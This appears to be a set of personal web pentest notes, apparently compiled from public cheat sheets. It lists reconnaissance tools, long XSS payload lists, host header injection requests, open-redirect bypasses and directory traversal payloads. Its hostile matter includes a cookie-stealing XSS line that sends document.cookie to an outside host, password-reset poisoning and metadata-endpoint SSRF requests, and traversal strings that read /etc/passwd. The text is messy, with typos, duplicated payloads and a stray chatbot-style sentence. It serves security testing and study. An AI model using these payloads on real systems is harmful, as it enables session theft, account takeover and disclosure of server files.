[PayloadsAllTheThings - GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings)
Search in [exploit-db](https://www.exploit-db.com/)

## Vulnerability Categories

- XSS
- Host Header Injection
- URL Redirection
- Parameter Tampering
- HTML Injection
- File Inclusion
- SPF Record Misconfiguration
- Insecure CORs Configuration
- SSRF
- Critical File Disclosure
- Source Code Disclosure
- CSRF
- Subdomain Takeover
- SQL Injection
- Command Injection
- File Upload Vulnerabilities
- XML Injection

## cURL to Burp Request Command
curl -x 127.0.0.1:8080

## 1. Information Gathering

- has to know the terminology and gather information about the version, Server, Frameworks, and Default credentials.
- Identify previous vulnerabilities related to the application.

### Injection Points

- Where vulnerabilities can exist.
- Injection paint is vulnerability location.(parameters)

### Information Flow

1. Site
2. Subdomains
3. Select unpopular websites
4. Find IP Address
5. Which programming language they are using
6. Open ports and services
7. Site:eur.nl responsible disclosure
8. sort out subdomain unpapularity (Less travel rout

### Tools for Finding Subdomains

- [VirusTotal](https://www.virustotal.com/gui/home/search)
- [Subbrute](https://github.com/TheRook/subbrute)
  ```bash
  ./subbrute.py -c 50 example.com > example.com
  ```
- [Altdns](https://github.com/infosec-au/altdns)
- [Netcraft](https://searchdns.netcraft.com/)
- [HTTP Status Checker](https://httpstatus.io/)
- [SubFinder](https://github.com/projectdiscovery/subfinder)

### Finding IP Address & Open Ports

- Ping to find tha ip address or use the namp to know the open ports aggresive scanning os and version information & vuln scanning.
- If it is not in scope do the poty numnber 80 and 443 for vulnerability scanning.

### Server Information & Banner Grabbing

```bash
whatweb domain.name
nikto -h domain.name
nc domain.name 80
nc head / http/1.0
telnet
waplayzer
```
---
## API Key and Token Leaks

```markdown
# API Key and Token Leaks

## Common Causes of Leaks

- **Hardcoding in Source Code**: Developers may unintentionally leave API keys or tokens directly in the source code.
- **Public Repositories**: Accidentally committing sensitive keys and tokens to publicly accessible version control systems like GitHub.
- **Hardcoding in Docker Images**: API keys and credentials might be hardcoded in Docker images hosted on DockerHub or private registries.
- **Logs and Debug Information**: Keys and tokens might be inadvertently logged or printed during debugging processes.
- **Configuration Files**: Including keys and tokens in publicly accessible configuration files (e.g., `.env` files, `config.json`, `settings.py`, or `.aws/credentials`).

## Scan a GitHub Organization

To scan an entire GitHub organization for leaks, run the following command:

```bash
docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --org=trufflesecurity
```

## Scan a GitHub Repository, its Issues, and Pull Requests

To scan a GitHub repository including its issues and pull requests, run:

```bash
docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --repo https://github.com/trufflesecurity/test_keys --issue-comments --pr-comments
```

## Scan a Docker Image for Verified Secrets

To scan a Docker image for secrets, use the following command:

```bash
docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest docker --image trufflesecurity/secrets
```
## Account Takeover

* [Password Reset Feature](#password-reset-feature)
    * [Password Reset Token Leak via Referrer](#password-reset-token-leak-via-referrer)
    * [Account Takeover Through Password Reset Poisoning](#account-takeover-through-password-reset-poisoning)
    * [Password Reset via Email Parameter](#password-reset-via-email-parameter)
    * [IDOR on API Parameters](#idor-on-api-parameters)
    * [Weak Password Reset Token](#weak-password-reset-token)
    * [Leaking Password Reset Token](#leaking-password-reset-token)
    * [Password Reset via Username Collision](#password-reset-via-username-collision)
    * [Account Takeover Due To Unicode Normalization Issue](#account-takeover-due-to-unicode-normalization-issue)
* [Account Takeover via Web Vulneralities](#account-takeover-via-web-vulneralities)
    * [Account Takeover via Cross Site Scripting](#account-takeover-via-cross-site-scripting)
    * [Account Takeover via HTTP Request Smuggling](#account-takeover-via-http-request-smuggling)
    * [Account Takeover via CSRF](#account-takeover-via-csrf)
    * Account Takeover via JWT - * JSON Web Token might be used to authenticate an user. Edit the JWT with another User ID / Email - Check for weak JWT signature

## Business Logic Errors

* [Methodology](#methodology)
    * [Review Feature Testing](#review-feature-testing)
    * [Discount Code Feature Testing](#discount-code-feature-testing)
    * [Delivery Fee Manipulation](#delivery-fee-manipulation)
    * [Currency Arbitrage](#currency-arbitrage)
    * [Premium Feature Exploitation](#premium-feature-exploitation)
    * [Refund Feature Exploitation](#refund-feature-exploitation)
    * [Cart/Wishlist Exploitation](#cartwishlist-exploitation)
    * [Thread Comment Testing](#thread-comment-testing)
* [References](#references)

## Methodology

Unlike other types of security vulnerabilities like SQL injection or cross-site scripting (XSS), business logic errors do not rely on problems in the code itself (like unfiltered user input). Instead, they take advantage of the normal, intended functionality of the application, but use it in ways that the developer did not anticipate and that have undesired consequences.

Common examples of Business Logic Errors.

### Review Feature Testing

* Assess if you can post a product review as a verified reviewer without having purchased the item.
* Attempt to provide a rating outside of the standard scale, for instance, a 0, 6 or negative number in a 1 to 5 scale system.
* Test if the same user can post multiple ratings for a single product. This is useful in detecting potential race conditions.
* Determine if the file upload field permits all extensions; developers often overlook protections on these endpoints.
* Investigate the possibility of posting reviews impersonating other users.
* Attempt Cross-Site Request Forgery (CSRF) on this feature, as it's frequently unprotected by tokens.

### Discount Code Feature Testing

* Try to apply the same discount code multiple times to assess if it's reusable.
* If the discount code is unique, evaluate for race conditions by applying the same code for two accounts simultaneously.
* Test for Mass Assignment or HTTP Parameter Pollution to see if you can apply multiple discount codes when the application is designed to accept only one.
* Test for vulnerabilities from missing input sanitization such as XSS, SQL Injection on this feature.
* Attempt to apply discount codes to non-discounted items by manipulating the server-side request.

### Delivery Fee Manipulation

* Experiment with negative values for delivery charges to see if it reduces the final amount.
* Evaluate if free delivery can be activated by modifying parameters.

### Currency Arbitrage

* Attempt to pay in one currency, for example, USD, and request a refund in another, like EUR. The difference in conversion rates could result in a profit.

### Premium Feature Exploitation

* Explore the possibility of accessing premium account-only sections or endpoints without a valid subscription.
* Purchase a premium feature, cancel it, and see if you can still use it after a refund.
* Look for true/false values in requests/responses that validate premium access. Use tools like Burp's Match & Replace to alter these values for unauthorized premium access.
* Review cookies or local storage for variables validating premium access.

### Refund Feature Exploitation

* Purchase a product, ask for a refund, and see if the product remains accessible.
* Look for opportunities for currency arbitrage.
* Submit multiple cancellation requests for a subscription to check the possibility of multiple refunds.

### Cart/Wishlist Exploitation

* Test the system by adding products in negative quantities, along with other products, to balance the total.
* Try to add more of a product than is available.
* Check if a product in your wishlist or cart can be moved to another user's cart or removed from it.

### Thread Comment Testing

* Check if there's a limit to the number of comments on a thread.
* If a user can only comment once, use race conditions to see if multiple comments can be posted.1
* If the system allows comments by verified or privileged users, try to mimic these parameters and see if you can comment as well.
* Attempt to post comments impersonating other users.

## References

* [Business Logic Vulnerabilities - PortSwigger - 2024](https://portswigger.net/web-security/logic-flaws)
* [Business Logic Vulnerability - OWASP - 2024](https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability)
* [CWE-840: Business Logic Errors - CWE - March 24, 2011](https://cwe.mitre.org/data/definitions/840.html)
* [Examples of Business Logic Vulnerabilities - PortSwigger - 2024](https://portswigger.net/web-security/logic-flaws/examples)

# 3. Cross-Site Scripting (XSS)

## XSS Background

**Impact of XSS:**
- Cookie theft
- Keylogging
- Phishing
- URL Redirection
- Site defacement

### Common XSS Injection Points

- Comment boxes
- Forums
- Signup/Login pages
- Search bars
- Registration forms
- Feedback forms
- Contact us forms etc....

Manual XSS Vector Building

## Steps to Find & Exploit XSS

1. Find an input field that reflects input.
2. Check response in **view-source**.
3. Close any open tags.
4. Use event handlers like `onmouseover` for bypassing sanitization.

Example: <input type="text" name="name" value='hello'>
<input type="submit" name="submit" value="search">
Payload: 'onmouseover='alert(1);

### Bypassing XSS Filters

- Bypass using UTF-8 Encoding
- Bypass using Unicode Encoding
- Bypass using HTML Encoding
- Bypass using Octal Encoding
- Bypass using Common WAF Bypass
  
## XSS Payloads
```html
"><script>alert(1)</script>
"><svg/onload=alert(1)>
%3cscript%3ealert%281%29%3c%2fscript%3e
<svg/OnLoad="`${prompt``}`">
<svg/onload=%26nbsp;alert`bohdan`+
1'"><img/src/onerror=.1|alert``>
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
</script><svg><script>alert(1)-%26apos%3B
anythinglr00</script><script>alert(document.domain)</script>uxldz
anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
<svg onload\r\n=$.globalEval("al"+"ert()");>
?"></script><base%20c%3D=href%3Dhttps:\mysite>
<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
<a href=javas&#99;ript:alert(1)>
\u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
"><img src=x onerror=alert(document.cookie);.jpg
<sCrIpt>alert(1)</ScRipt>
<ScrIPt>alert(1)</ScRipT>
<img src='1' onerror='alert(0)' <
<a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>
<script>onerror=alert;throw 1337</script>
<script>{onerror=alert}throw 1337</script>
<script>throw onerror=alert,'some string',123,'haha'</script>
<img src='1' onerror\x00=alert(0) />
<img src='1' onerror\x0b=alert(0) />
<img src='1' onerror\x0d=alert(0) />
<img src='1' onerror\x0a=alert(0) />
<img src='1' onerror/=alert(0) />
<img/src='1'/onerror=alert(0)>
𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
javascript:alert(1)//INJECTX
<svg/onload=alert(1)>//INJECTX
<img onload=alert(1)>//INJECTX
<img src=x onerror=prompt(1)>//INJECTX
<a href="javascript:alert(1)" onmouseover=alert(1)>INJECTX HOVER</a>
 onmouseover="document.cookie=true;">//INJECTX
alert(1)>//INJECTX
<h1>INJECTX</h1>
<img src=x onload=prompt(1) onerror=alert(1) onmouseover=prompt(1)>
<svg><script>/<@/>alert(1)</script>//INJECTX
<svg/onload=alert(/INJECTX/)>
<iframe/onload=alert(/INJECTX/)>
<svg/onload=alert`INJECTX`>
<svg/onload=alert(/INJECTX/)>
<svg/onload=alert(`INJECTX`)>
}alert(/INJECTX/);{//
<h1/onclick=alert(1)>a//INJECTX
<svg/onload=alert(/INJECTX/)>
<p/onclick=alert(/INJECTX/)>a
<svg/onload=alert`INJECTX`>
<svg/onload=alert(/INJECTX/)>
<svg/onload=alert(`INJECTX`)>
<video><source onerror="javascript:alert(1)">//INJECTX
<video onerror="javascript:alert(1)"><source>//INJECTX
<audio onerror="javascript:alert(1)"><source>//INJECTX
<input autofocus onfocus=alert(1)>//INJECTX
<select autofocus onfocus=alert(1)>//INJECTX
<textarea autofocus onfocus=alert(1)>//INJECTX
<keygen autofocus onfocus=alert(1)>//INJECTX
<button form=test onformchange=alert(1)>//INJECTX
<form><button formaction="javascript:alert(1)">//INJECTX
<svg onload=(alert)(1) >//INJECTX
<script>$=1,alert($)</script>//INJECTX
<!--<img src="--><img src=x onerror=alert(1)//">//INJECTX
<img/src='x'onerror=alert(1)>//INJECTX
<marguee/onstart=alert(1)>//INJECTX
<script>alert(1)//INJECTX
<script>alert(1)<!--INJECTX
<marquee loop=1 width=0 onfinish=alert(1)>//INJECTX
<a href=javas&#99;ript:alert(1)>
anythinglr00</script><script>alert(document.domain)</script>uxldz
anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
<svg/onrandom=random onload=confirm(1)>
<video onnull=null onmouseover=confirm(1)>
<svg/OnLoad="`${prompt``}`">
<svg/onload=%26nbsp;alert`bohdan`+
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
</script><svg><script>alert(1)-%26apos%3B
?"></script><base%20c%3D=href%3Dhttps:\mysite>
?"></script><base%20c%3D=href%3Dhttps:\mysite>
\u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
<a href=javas&#99;ript:alert(1)>
<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
anythinglr00</script><script>alert(document.domain)</script>uxldz
anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
```
1. Characters ' " < > / // ( ) ^ script img svg div alert prompt 
2. Event Handlers

### White Characters Identifying XSS

- Special characters: `' " < > / // ( ) ^ script img svg div alert prompt`
- Event Handlers:

```bash
Hello" onkeypress="prompt(1)
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>
<svg/OnLoad="`${prompt``}`">
<svg/onload=alert`bohdan`>
```

### Practical XSS Exercises

- [Prompt.ml](https://prompt.ml/0)
- [XSS Lab](http://leettime.net/xsslab1/)

# XSS & Host Header Injection Testing Guide

## 1. First SDIPER Application
- Sort out the parameters.
- Check one by one → Send to repeater → Use payloads (`hello1`, `hello2`).
- If `hello2` is reflecting, try scripts or brute-force attacks.
- Sort the maximum length of the first 10 results, then show the response in the browser.

### Payload Naming:
- Use `xss.txt` for payloads or manually set a payload.
- Manual testing is better for stored XSS vulnerabilities.

## 2. Brute-Force Attack Considerations
- If you want to stop URL encoding, go for payload encoding.
- Uncheck URL encoding for better results.

## 3. XSS Through Header Injection
- Capture the request using **Burp Suite**.
- Add a `Referer` field below the `Host` in the header.
- Send it to the repeater:
  ```
  Host: abc.com
  Referer: hello
  ```
- If `hello` is reflecting, use the following payload:
  ```html
  <script>alert(1)</script>
  ```

## 4. URL Redirection
- Instead of `alert(1)`, use URL redirection.
- If it redirects to `bing.com`, it is vulnerable.
  ```html
  <script>document.location.href="http://bing.com"</script>
  ```
  Example vulnerable URL:
  ```
  http://www.woodlandwordwide.com/wnew.faces/tiles/page/search.jsp?searchkey=<script>document.location.href="http://bing.com"</script>
  ```

## 5. Phishing via XSS
- Instead of `alert(1)`, use an iframe:
  ```html
  <iframe src="http://bing.com" height="100%" width="100%"></iframe>
  ```

## 6. Cookie Stealing via XSS
- Victim's website transfers cookies to the attacker's site:
  ```html
  <script>document.location.href="http://bing.com/p/?page="+document.cookie</script>
  ```

## 7. XSS Through File Uploading
### Method 1:
- The `file_name` parameter is reflecting in the **view-source** (e.g., `abc.jpeg`).
- Attack by injecting scripts into the filename.
- Use **Intruder** with common payloads.

### Method 2:
- Upload a file containing an XSS script.
- Access the file to trigger the payload.

## 8. XSS Through RFI Vulnerability
- If an application has RFI vulnerability, host an XSS script on the attacker's server:
  ```
  http://10.10.11.24/xss.html  # Contains XSS payload
  ```
- Execute via a vulnerable endpoint:
  ```
  http://abc.com/cmn/js/ajax.php?url=http://10.10.11.24/xss.html
  ```

## 9. Self-XSS to Reflected XSS
- Copy the vulnerable **HTML response** from Burp Suite.
- Save it as an HTML file and open it in Firefox.
- Instead of `alert(1)`, use:
  ```html
  document.location.href="http://bing.com"
  ```
- Example:
  ```
  /@213dewf it is reflecting in browser → add XSS script:
  /@213dewf"><script>alert(1)</script>
  ```
---
# Host Header Injection
## 1. Overview
- Exploiting host header injection in **virtual hosting environments**.
- Can lead to **web cache poisoning, XSS, password reset poisoning, and internal host access**.
- i.e 3xx and 200 status code of 300 | 301 | 302 | 303 | 304 -- 3xx is the best one for this attack for an example login page has multiple redirection request, modify any one of them
- Tools: https://github.com/inpentest/HostHeaderScanner - python host_header_scanner.py http://target.com --threads 10 --verbose 2 --oob oob.example.com
- [https://portswigger.net/bappstore/3908768b9ae945d8adf583052ad2e3b3 headi -url http://target.com](https://www.blackhatethicalhacking.com/tools/headi/) headi -url http://target.com
- https://github.com/inpentest/HostHeaderScanner bash script.sh -l urls.txt

    - **Host**: The primary header to test. Try injecting arbitrary domains.
    - **X-Forwarded-Host**: Often used by proxies; can override the Host header.
    - **X-Host**, **X-Forwarded-Server**, **X-HTTP-Host-Override**, **Forwarded**: Alternative headers that may be parsed by backend systems.
    - **Absolute URLs in request line**: Some servers prioritize the URL over the Host header.
    - **Duplicate Host headers**: Can cause discrepancies between frontend and backend parsing.
    - **Line wrapping or malformed headers**: Indentation or spacing tricks may bypass validation.

```http
Host: bing.com
Host: fake.target.com
X-Forwarded-Host: realweb.com

Host: realweb.com
X-Forwarded-Host: bing.com
Referer: https://www.bing.com/
Try to change host and referer header because few host is verify for referer header information. 
also do the same first three attack to insert the referer header (Change referer header)

Host: bing.com"><script>alert(1)</script>

GET / HTTP/1.1
Host: vulnerable.com
Host: attacker.com

GET / HTTP/1.1
Host: vulnerable.com
X-Forwarded-Host: attacker.com

GET https://vulnerable.com/ HTTP/1.1
Host: attacker.com

Host Header Injection on Referer Header
Connection: close
Referer: https://www.bing.com/

GET / HTTP/1.1
Host: vulnerable.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
X-HTTP-Host-Override: attacker.com
Forwarded: host=attacker.com

Host: evil.com:8080
Host: legit.com.evil.com

Host: target.com.evil.io
Host: target.com.attacker.net
Host: evil.com?target.com
Host: target.com#evil.com

X-Forwarded-Host: evil.com
X-Host: attacker.com
X-Forwarded-Server: evil.com
X-HTTP-Host-Override: evil.com

- Use **non-standard ports**: `Host: evil.com:badport`
- Try **subdomain tricks**: `Host: attacker.vulnerable.com`
- Use **encoded characters**: `%0d%0aHost: evil.com`
- Leverage **proxy headers**: Some WAFs ignore `X-Forwarded-Host`

```
Based on your GitHub lab on [HTTP Host Header Attacks](https://github.com/Anvesh464/Portswigger-Labs/tree/main/20%20-%20HTTP%20Host%20header%20attacks), here's a **step-by-step breakdown** for each attack scenario from the PortSwigger labs.

# 📌 **2.2 Password Reset Poisoning**
```
POST /forgot HTTP/1.1
Host: evil.com
Content-Type: application/json

{"email":"victim@example.com"}
```
# 📌 **2.4 SSRF Using Host Header**
```
Host: 127.0.0.1
Host: 169.254.169.254   # AWS metadata
Host: localhost
```
# 📌 **2.5 Admin Panel / VHost Bypass**
```
Host: admin.target.com
Host: internal.target.local
Host: staging.target.com
```
# 🔥 **3.3 Port-Based Bypass**

```
Host: target.com:443
Host: target.com:80
Host: target.com:8080
Host: target.com:*
```
# 🔥 **3.4 Whitespace / Tab Injection Bypass**
```
Host: evil.com%20
Host: evil.com%0d%0aInjected: yes
Host: evil.com\t
Host: evil.com\r\nX-Test: 123
punycode  Host: xn--evil-9sa.com
Using IP-long form  Host: 2130706433     # 127.0.0.1 in decimal
Hex:   Host: 0x7f000001
Octal:   Host: 0177.0000.0001
Mixed Encoding" Host: evil.com%2Etarget.com
Fake trusted-host prefix
Host: trusted.com.evil.com
Null Byte / Special Character Bypass Host: evil.com%00target.com
Host: target.com%00.evil.com
Host: target.com\evil.com
3.8 CORS Bypass Using Host Reflection**
Host: evil.com
Origin: http://evil.com
*3.9 CDN / Proxy Bypass (Akamai, Cloudflare, Nginx)**
Forwarded: host=evil.com
X-Forwarded-Host: internal-admin
```
---

| Tool | Description |
|------|-------------|
| [Burp Suite](https://portswigger.net/burp) | Use Repeater and Intruder to test header combinations. |
| [Headi](https://www.blackhatethicalhacking.com/tools/headi/) | Automates header injection with proxy-aware payloads. |
| [HostHeaderScanner](https://github.com/inpentest/HostHeaderScanner) | Detects Host Header Injection and SSRF via proxy headers. |
| [Param Miner (Burp Extension)](https://portswigger.net/bappstore/9f3c3b7b9e4f4e3e9c3d3e3b9f3c3b7b) | Finds hidden headers and ambiguous parsing behavior. |

### 🧪 **Advanced Proxy Bypass Tricks**

- **Use internal IPs**: `Host: 127.0.0.1` or `Host: 192.168.0.1`
- **Subdomain spoofing**: `Host: attacker.vulnerable.com`
- **Header fuzzing**: Try variations like `X-Forwarded-For`, `X-Real-IP`, `X-Originating-IP`
- **Cache poisoning**: Inject headers that affect CDN behavior (e.g., `Vary`, `X-Forwarded-Proto`)

---
# 4. URL Redirection (Used as a Phishing Attack) or Open Redirection

## HTTP Status Code: 3xx, 200

1. **Sort the Parameters Returning a 200 Response:**
   ```
   GET /url=https://bing.com/
   ```

### Common Parameters List:
```
dest,redirect,?,something is redirect to page
uri,path,continue,url,window,to,out,view,dir,show,navigation,Open,url,file,val,validate,domain,callback,return,page,feed,host,port,next,data,reference,site,html,u=
```

### Payload Examples:
```
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
?checkout_url={payload}
?continue={payload}
?dest={payload}
?destination={payload}
?go={payload}
?image_url={payload}
?next={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
?return_path={payload}
?return_to={payload}
?return={payload}
?returnTo={payload}
?rurl={payload}
?target={payload}
?url={payload}
?view={payload}
/{payload}
/redirect/{payload}
```

### Approach:
1. **### Bypassing Techniques:**
   
- **Using a whitelisted domain**: `https://www.whitelisted.com/evil.com` → redirects to `evil.com`
- **Using // to bypass http**:  `//google.com`
- **Using //// to bypass http**:  `////google.com`
- **Using https: to bypass //**:  `https:google.com`
- **Using \/\/ to bypass //**:  `\/\/google.com/` or `/\/google.com/`
- **Using %E3%80%82 to bypass .**:  `//google%E3%80%82com` or `/?redir=google。com`
- **Using null byte %00**:  `//google%00.com`
- **Using CRLF to bypass javascript**:  `java%0d%0ascript%0d%0a:alert(0)`
- **Using parameter pollution**:  `?next=whitelisted.com&next=google.com`
- **Using @ character**:  `http://www.theirsite.com@yoursite.com/`
- **Using folder as domain**:  `http://www.yoursite.com/http://www.theirsite.com/`, http://www.yoursite.com/folder/www.folder.com`
- **Using ? character**:  `http://www.yoursite.com?http://www.theirsite.com/`,`http://www.yoursite.com?folder/www.folder.com`
- **Using Unicode normalization**:  `https://evil.c℀.example.com` → interpreted as `https://evil.ca/c.example.com`,`http://a.com／X.b.com`
- - **Basic external redirect**: ?next=https://google.com
- **HTTP protocol injection**:  ?redirect=http://example.com
- **HTTPS protocol injection**:  ?url=https://test.com
- **Relative path redirect**:  ?redirect=/../external.com
- **Double slash bypass**:  ?redirect=//evil.com
- **URL-encoded redirect**:  ?redirect=%2F%2Fevil.com
- **Double URL encoding bypass**:    ?redirect=%252F%252Fevil.com
- **JavaScript protocol injection**:    ?redirect=javascript:alert(1)
- **Data URI redirection**:  ?next=data:text/plain,redirect
- **Open redirect via // in path**:   ?redirect=//attacker.com
- **Open redirect via @ character**:  ?redirect=http://google.com@evil.com
- **Open redirect via backslash**:  ?url=http:\evil.com
- **Mixed encoding redirect**:    ?redirect=%2F%2Fevil.com%3Fnext%3Dtest
- **Dot prefix redirect**:  ?redirect=.//attacker.com
- **Subdomain bypass**:  ?redirect=https://legit.com.evil.com
- **Null byte injection**:  ?url=https://legit.com%00.evil.com
- **Trailing slash confusion**:  ?redirect=https://evil.com/./
- **Query parameter injection**:  ?next=?redirect=https://evil.com
- **Fragment identifier bypass**:  ?redirect=https://evil.com#test
- **Redirect via JSON body**:  {"redirect":"https://evil.com"}

2 ## 🔗 Protocol Injection Payloads
- **HTTP injection**: ?redirect=http://evil.com 
- **HTTPS injection**: ?url=https://evil.com 
- **JavaScript injection**: ?redirect=javascript:alert(1) 
- **Data URI injection**: ?next=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== 
- **FTP injection**: ?redirect=ftp://evil.com/file 
- **File protocol**: ?redirect=file:///etc/passwd 
- **Mailto injection**: ?redirect=mailto:test@evil.com 
- **Telnet injection**: ?redirect=telnet://evil.com 
- **WS injection**: ?redirect=ws://evil.com/socket 
- **WSS injection**: ?redirect=wss://evil.com/socket
---

3 ## 🧩 Encoding Tricks
- **URL encoded double slash**: ?redirect=%2F%2Fevil.com 
- **Double URL encoding**: ?redirect=%252F%252Fevil.com 
- **Unicode dot bypass**: ?redirect=//google%E3%80%82com 
- **Null byte injection**: ?url=https://legit.com%00.evil.com 
- **Mixed encoding**: ?redirect=%2F%2Fevil.com%3Fnext%3Dtest 
- **CRLF injection**: ?redirect=java%0d%0ascript:alert(1) 
- **Hex encoding**: ?redirect=%2e%2e%2fevil.com 
- **Octal encoding**: ?redirect=%056evil.com 
- **UTF-16 encoding**: ?redirect=%u002f%u002fevil.com 
- **Overlong UTF-8 encoding**: ?redirect=%c0%af%c0%afevil.com
---
4 ## 📂 Path & Domain Tricks
- **Relative path**: ?redirect=/../evil.com 
- **Dot prefix**: ?redirect=.//evil.com 
- **Folder as domain**: http://yoursite.com/http://evil.com 
- **Trailing slash confusion**: ?redirect=https://evil.com/./ 
- **Subdomain bypass**: ?redirect=https://legit.com.evil.com 
- **Unicode normalization**: http://a.com／X.b.com 
- **Double slash bypass**: ?redirect=////evil.com 
- **Escaped slashes**: ?redirect=\/evil.com 
- **Backslash escape**: ?url=http:\evil.com 
- **Fragment bypass**: ?redirect=https://evil.com#test
---
5 ## ⚙️ Parameter Tricks
- **Basic external redirect**: ?next=https://evil.com 
- **Parameter pollution**: ?next=whitelisted.com&next=evil.com 
- **Nested parameter**: ?next=?redirect=https://evil.com 
- **Multiple query injection**: ?url=https://legit.com?redirect=https://evil.com 
- **Encoded query**: ?redirect=https://evil.com%3Fparam%3Dtest 
- **Parameter override**: ?redirect=https://legit.com&redirect=https://evil.com 
- **Whitelist bypass**: ?redirect=https://legit.com.evil.com 
- **Chained parameters**: ?next=https://legit.com?next=https://evil.com 
- **Encoded ampersand**: ?redirect=https://evil.com%26param=test 
- **Parameter splitting**: ?redirect=https://evil.com?param1=value1&param2=value2
---
6 ## 📦 JSON / Body Tricks
- **JSON body redirect**: {"redirect":"https://evil.com"} 
- **Nested JSON**: {"data":{"url":"https://evil.com"}} 
- **Array JSON**: {"redirect":["https://legit.com","https://evil.com"]} 
- **Base64 JSON**: {"redirect":"aHR0cHM6Ly9ldmlsLmNvbQ=="} 
- **Escaped JSON**: {"redirect":"https:\/\/evil.com"} 
- **Null JSON**: {"redirect":null,"next":"https://evil.com"} 
- **Boolean JSON**: {"redirect":true,"url":"https://evil.com"} 
- **Key confusion**: {"url":"https://legit.com","redirect":"https://evil.com"} 
- **Nested object**: {"config":{"redirect":"https://evil.com"}} 
- **Mixed encoding JSON**: {"redirect":"https:%2F%2Fevil.com"}

# Directory Traversal

```text
file, filename, filepath, path, dir, directory, folder, page, doc, document, download, include, resource, view, template, theme, skin, pdf, img, image, icon, style, css, js, script, asset, config, config_file, config_path, log, log_file, log_path, backup, restore, target, location, lang, language, locale, base, basepath, root, home, url, uri, endpoint, slug
```
### **1. Basic Traversal Payloads**
../, ..\, ..//, ..\\, .../, ...\\
../../../../../../etc/passwd
..%2f..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252f..%252fetc/passwd
1. **Basic Traversal** |    - Use when no filtering is applied.   - Payload: `../../../../etc/passwd`
2. **Absolute Path Bypass** |    - Works when the app prepends a default directory and allows absolute paths.    - Payload: `/etc/passwd`
3. **Non-Recursive Filter Bypass** |   - Bypasses filters that strip `../` only once.     - Payload: `....//....//etc/passwd`
4. **Double URL Encoding** |    - Bypasses filters that decode input before checking.     - Payload: `%252e%252e%252f%252e%252e%252fetc%252fpasswd`
5. **Unicode Encoding** |    - Uses Unicode representations of `.` and `/`.     - Payload: `%u002e%u002e%u2215%u002e%u002e%u2215etc%u2215passwd`
6. **Overlong UTF-8 Encoding** |    - Exploits invalid UTF-8 sequences accepted by some decoders.     - Payload: `%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd`
7. **Null Byte Injection** |    - Bypasses file extension validation by truncating `.jpg`.     - Payload: `../../../etc/passwd%00.jpg`
8. **Path Prefix Validation Bypass** |    - Satisfies prefix check while still traversing directories.    - Payload: `/images/../../../etc/passwd`
9. **Mangled Path** |    - Confuses filters by duplicating traversal sequences.     - Payload: `/.../.../.../.../.../.../.../.../.../etc/passwd`
10. **Backslash Variant (Windows)** |     - Useful on Windows-based servers.     - Payload: `..\\..\\..\\windows\\win.ini`

### **2. Encoded Variants**
%2e%2e%2f, %252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%u002e%u002e%u2215

### **3. Bypass Techniques**
..././, ...\\.\\, ..;/, ..%00/
\\\\localhost\\c$\\windows\\win.ini
////////../../../../etc/passwd

### **4. Target Files (Linux)**
/etc/passwd
